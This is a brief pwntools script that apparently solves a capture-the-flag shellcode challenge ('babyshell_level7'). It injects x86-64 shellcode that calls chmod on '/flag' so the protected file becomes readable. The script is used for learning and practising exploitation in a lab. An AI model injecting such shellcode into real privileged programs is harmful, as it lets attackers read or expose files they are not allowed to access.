from pwn import *

context.update(arch="x86-64", encoding="latin")

p = process("/challenge/babyshell_level7")

shellcode = f'''
.global _start
_start:
.intel_syntax noprefix
        mov rdi, 0x67616c662f
        push rdi
        lea rdi, [rsp]
        mov rsi, 4
        mov rax, 0x5a
        syscall

        xor rdi, rdi
        mov rax, 60
        syscall
'''

shellcode = asm(shellcode)

p.readuntil(b"Reading 0x4000 bytes from stdin.")
p.write(shellcode)
print(p.readall())
